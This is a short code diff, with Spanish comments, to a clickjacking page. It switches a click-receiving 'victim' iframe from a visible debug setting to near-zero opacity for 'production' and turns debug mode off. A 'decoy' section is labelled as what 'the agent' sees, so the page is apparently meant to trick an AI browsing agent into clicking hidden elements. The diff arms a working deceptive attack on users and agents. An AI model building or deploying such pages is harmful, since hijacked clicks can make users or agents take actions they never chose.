@@ -85,8 +85,8 @@ body {
   pointer-events: all;     /* recibe los clicks */
 
   /* ── CAMBIAR SEGÚN MODO ── */
-  /* opacity: 0.00001; */   /* producción: casi invisible */
-  opacity: 0.4;             /* debug: descomentar para ver el iframe */
+  opacity: 0.00001;         /* producción: casi invisible */
+  /* opacity: 0.4; */       /* debug: descomentar para ver el iframe */
 }
 
 /* ── DECOY — lo que ve el agente ── */
@@ -360,7 +360,7 @@ body {
     4. Anotar el valor y ponerlo en el CSS .victim { top: -Npx }
 */
 
-const DEBUG_MODE = true; // ← cambiar a true para ver el iframe
+const DEBUG_MODE = false; // ← cambiar a true para ver el iframe
 
 if (DEBUG_MODE) {
   document.querySelector('.victim').style.opacity = '0.45';
